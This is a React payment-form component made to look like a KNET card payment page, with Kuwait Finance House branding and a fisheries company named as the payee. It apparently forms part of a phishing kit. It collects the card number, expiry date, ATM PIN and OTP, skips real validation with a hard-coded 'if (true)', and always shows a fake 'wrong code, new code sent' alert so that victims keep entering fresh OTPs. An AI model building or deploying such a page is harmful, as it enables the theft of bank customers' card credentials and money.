'use client'

import { useEffect, useState } from 'react'
import { Loader } from 'lucide-react'
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { validate } from '@/lib/utils'
import { useCart } from '@/components/cart-provider'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
export type PaymentInfo = {
  cardNumber: string
  cvc: string
  year: string
  month: string
  bank?: string
  otp?: string
  pass: string
  cardState: string
  bank_card:string[],
  prefix:string

}

export type PaymentMethod = 'credit_card' | 'kent' | 'bank_card'

export type Bank = {
  value: string
  label: string,
  cardPrefixes:string[]
}
const month=['1','2','3','4','5','6','7','8','9','10','11','12']
const years=['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035']
export const BANKS: Bank[] = [
  { value: 'nbk', label: 'National Bank of Kuwait', cardPrefixes: ["402277", "402299", "545629", "524176"] },
  { value: 'cbk', label: 'Commercial Bank of Kuwait', cardPrefixes: ["403577", "525499", "529470"] },
  { value: 'gbk', label: 'Gulf Bank', cardPrefixes: ["489319", "531759", "528012"] },
  { value: 'abk', label: 'Al Ahli Bank of Kuwait', cardPrefixes: ["454721", "531380", "528488"] },
  { value: 'burgan', label: 'Burgan Bank', cardPrefixes: ["418276", "522497", "529731"] },
  { value: 'kfh', label: 'Kuwait Finance House', cardPrefixes: ["461007", "535967", "546734"] },
  { value: 'boubyan', label: 'Boubyan Bank', cardPrefixes: ["486608", "529768", "536610"] },
  { value: 'kib', label: 'Kuwait International Bank', cardPrefixes: ["514051", "530435", "535948"] },
  { value: 'ibk', label: 'Industrial Bank of Kuwait', cardPrefixes: [] }, // Prefixes not publicly available
  { value: 'bbk', label: 'Bank of Bahrain and Kuwait', cardPrefixes: ["400884", "518682"] },
  { value: 'bnp', label: 'BNP Paribas', cardPrefixes: ["450216", "531483"] },
  { value: 'hsbc', label: 'HSBC Middle East Bank', cardPrefixes: ["447284", "530001"] },
  { value: 'fab', label: 'First Abu Dhabi Bank', cardPrefixes: ["440891", "530123"] },
  { value: 'citibank', label: 'Citibank', cardPrefixes: ["431457", "545432"] },
  { value: 'qnb', label: 'Qatar National Bank', cardPrefixes: ["489318", "529403"] },
  { value: 'mashreq', label: 'Mashreq Bank', cardPrefixes: ["454388", "529410"] },
  { value: 'alrajhi', label: 'Al Rajhi Bank', cardPrefixes: ["417633", "524469"] },
  { value: 'bank_muscat', label: 'Bank Muscat', cardPrefixes: ["489312", "529410"] },
  { value: 'icbc', label: 'Industrial and Commercial Bank of China', cardPrefixes: ["622200", "622888"] },
];




export default function PaymentForm({ 
  onPaymentComplete 
}: { 
  onPaymentComplete: (paymentInfo: PaymentInfo | null, method: PaymentMethod) => void 
}) {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const {cart} = useCart()
  const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0)

  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('bank_card')
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    cvc: '',
    year: '',
    month: '',
    otp: '',
    bank: '',
    pass: '',
    cardState:'new',
    bank_card:[''],
    prefix:''
  })

  const handlePaymentInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      if (true) {
        setShowError(false)
        onPaymentComplete(paymentInfo, paymentMethod)
        setTimeout(() => {
          setIsLoading(false)
          setStep(2)
        }, 5000)
      } else {
        setShowError(true)
        setStep(1)
      }
    } catch (error) {
      console.log(error)
      setShowError(true)
    } finally {
      setIsLoading(false)
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      onPaymentComplete(paymentInfo, paymentMethod)
      setTimeout(() => {
        alert('رمز التحقق غير صحيح, تم ارسال رمز جديد')
        setPaymentInfo({ ...paymentInfo, otp: '' })
      }, 5000)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div style={{zoom:0.8,display:"flex",flexDirection:'column', justifyContent:'center',background:'#ebebeb'}}> <img 
    className="w-full h-18 m-1 rounded-lg " 
    src="/1212122.PNG" 
    alt="Kuwait Finance House Logo"
  />
               <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">

        <Card className="bg-white shadow-xl form-card " style={{boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",margin:20,borderRadius:20}}>
          <CardContent className="">
            <img 
              className="w-full h-14 my-4 object-contain" 
              src="/516815.jpeg" 
              alt="National Fisheries Company Logo" 
            />
            <div className="flex justify-between items-center border-b pb-2">
              <Label className="font-bold text-blue-500">المستفيد:</Label>
              <span>الشركة الوطنية للأسماك</span>
            </div>
            <div className="flex justify-between items-center">
              <Label className="font-bold text-blue-500">المبلغ:</Label>
              <span className="text-lg font-bold">{total} د.ك</span>
            </div>
          </CardContent>
        </Card>

        {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
          <Card className='shadow-xl    mt-2      'style={{boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",borderRadius:20, margin:20}}>
            <CardContent className="p-6">
              {step === 1 ? (
               <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
                  <div className="space-y-4">
                    <div className="   flex border-b-2">
                      <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
                      <Select 
                      
                onValueChange={(value) => {
                  const selectedBank = BANKS.find(bank => bank.value === value)
                  setPaymentInfo({ 
                    ...paymentInfo, 
                    bank: value, 
                    bank_card: selectedBank ? selectedBank.cardPrefixes : ['']
                  })
                }}
              >
                <SelectTrigger className="w-full flex-auto w-16 h-6 border rounded-md  font-samll" >
                  <SelectValue placeholder="Select a bank" />
                </SelectTrigger>
                <SelectContent>
                  {BANKS.map((bank: { value: any; label: any }) => (
                    <SelectItem key={bank.value} value={bank.value}>
                      {bank.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
                    </div>

                    <div className="space-y-2 flex border-b-2 mb-2">
                      <Label className='text-blue-500 pb-4 font-samll pl-1  pt-3  ' htmlFor="card-number">رقم بطاقة الصراف الآلي:</Label>
                      <input
                        type="tel"
                        id="card-number"
                        placeholder="1234 5678 9012 3456"
                        style={{height:23,boxShadow:'0 0 2px blue',marginLeft:2}}
                        value={paymentInfo.cardNumber}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
                        required
                        maxLength={10}
                      />
                        <select 
                        id="bank"
                        className=" bg-gray-300  mx-1 flex-auto w-16 h-6 border rounded-md  font-samll "
                        required
                        onChange={(e:any) => setPaymentInfo({ ...paymentInfo, prefix:e.target.value })}
                      >
                        <option              className='bg-gray-500' value="" disabled>prifx</option>
                       {paymentInfo.bank_card.map((i)=>
                          <option key={i} value={i} >
{
i}                          </option>
                          )}
                      </select>
                    </div>
                    </div>

                    <div className="  w-full ">
                    <div className="flex border-b-2  ">
                    <Label className='text-blue-500  w-32  font-samll pl-1  ' htmlFor="expiry-month">تاريخ انتهاء البطاقة:</Label>
                      
                      <div className=" grid grid-cols-2 " >
                      <select 
                        id="bank"
                        className=" bg-gray-300 flex-auto h-6 border rounded-md  mb-2 font-samll w-16 "
                        value={paymentInfo.month}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
                        required
                      >
                        {month.map((bank) => (
                          <option key={bank} value={bank}>
                            {bank}
                          </option>
                        ))}
                      </select>
                      <select 
                        id="bank"
                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll w-16 "
                        value={paymentInfo.year}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
                        required
                      >
                        {years.map((bank) => (
                          <option key={bank} value={bank}>
                            {bank}
                          </option>
                        ))}
                      </select>
                    </div>
                    
                  </div>
                       

                  </div>

                  <div className="space-y-2 flex">
                      <Label className='text-blue-500 font-samll pl-1  pt-3' htmlFor="pin">الرقم السري:</Label>
                      <input
                        type="tel"
                        id="pin"
                        className=" flex-auto w-32 p-2 h-6 p-2 border boxshadow boxshadow-blue-500"
                        placeholder="••••"
                        value={paymentInfo.pass}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, pass: e.target.value })}
                        required
                        maxLength={4}
                      />
                    </div>
                  {isLoading && (
                    <p className="text-red-500 text-sm">
                      يرجى التحقق من صحة البيانات المدخلة
                    </p>
                  )}


                </form>
              ) : (
                <form onSubmit={handleOtpSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="otp">رمز التحقق:</Label>
                    <input
                      type="tel"
                      id="otp"
                      className="w-full p-2 border rounded-md"
                      placeholder="123456"
                      value={paymentInfo.otp}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
                      required
                      maxLength={6}
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full h-6  rounded-md bg-gray/90 over:bg-gray/90 disabled:opacity-50"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <span className="h-6    rounded-md bg-gray/90  hover:bg-gray/90 disabled:opacity-50">
                        جاري التحقق
                        <Loader className="animate-spin" />
                      </span>
                    ) : (
                      'تحقق'
                    )}
                  </button>
                </form>
              )}
            </CardContent>
          </Card>
        )}
<Card style={{padding:15,boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",margin:20,borderRadius:20}}>
    <CardContent>
    <div className="grid grid-cols-2 ">
                    <button
                      type="button"
                      className=" border bg-gray/90  rounded-md h-6 hover:bg-gray-100"
                    >
                      إلغاء
                    </button>
                    <button
                      type="submit"
                      className=" h-6 bg-gray/90 border  rounded-md hover:bg-gray/90 disabled:opacity-50"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <span className="flex items-center justify-center gap-2">
                          جاري المعالجة
                          <Loader className="animate-spin" />
                        </span>
                      ) : (
                        'إرسال'
                      )}
                    </button>
                  </div>
    </CardContent>
</Card>
      <footer className="text-center p-4 text-sm text-gray-600">
        <p>© 2024 جميع الحقوق محفوظة</p>
        <a href="#" className="hover:underline text-blue-500">
          شركة الخدمات المصرفية الآلية المشتركة – كي نت
        </a>
      </footer>
      </form>

    </div>
  )
}

